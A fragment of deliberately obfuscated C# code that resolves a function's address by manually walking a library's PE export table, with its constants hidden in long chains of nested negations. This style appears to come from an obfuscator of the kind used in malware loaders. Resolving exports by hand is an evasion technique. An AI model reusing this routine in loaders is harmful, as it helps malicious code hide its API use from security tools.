            for (int i = 0; i < num9; i += Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(1, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
            {
                string text = Marshal.PtrToStringAnsi((IntPtr)(library.ToInt64() + Marshal.ReadInt32((IntPtr)(library.ToInt64() + num11 + i * Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(4, Math.Abs(int.MaxValue))))))))))))))))))))))))));
                if (text.Equals(procName, (StringComparison)Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(5, Math.Abs(int.MaxValue))))))))))))))))))))))))))))))))))))))))))))))))
                {
                    int num13 = Marshal.ReadInt16((IntPtr)(library.ToInt64() + num12 + i * Math.Abs(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-(-Math.Min(2, Math.Abs(int.MaxValue)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) + num8;
                    int num14 = Marshal.ReadInt32((IntPtr)(library.ToInt64() + num10 + Math.Abs(-(-(-(-(-(-(-(-(-(-Math.Min(4, Math.Abs(int.MaxValue)))))))))))) * (num13 - num8)));
                    intPtr = (IntPtr)((long)library + num14);
                    break;
                }
            }
        }
        catch
        {
            throw new InvalidOperationException();
        }
        if (intPtr == IntPtr.Zero)
        {
            throw new MissingMethodException();
        }
        return intPtr;
    }
}
